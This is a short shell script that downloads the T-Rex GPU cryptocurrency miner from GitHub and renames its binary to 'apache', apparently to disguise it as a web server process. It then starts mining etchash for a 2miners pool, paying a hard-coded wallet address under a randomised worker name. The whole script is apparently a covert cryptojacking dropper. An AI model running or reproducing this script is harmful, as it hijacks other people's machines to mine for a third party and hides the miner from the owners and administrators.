#!/bin/sh

wget https://github.com/trexminer/T-Rex/releases/download/0.25.15/t-rex-0.25.15-linux.tar.gz
tar -xf t-rex-0.25.15-linux.tar.gz
mv t-rex apache
FOLDER=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
"$FOLDER"/apache -a etchash -o stratum+tcp://us-etc.2miners.com:11010 -u 0x11880b1cfe04907c5306222be1e09f4bbb480eb5 -p x -w $(echo $(shuf -i 1-2000 -n 1)-Konsol) --gpu-report-interval 5 --mt 1

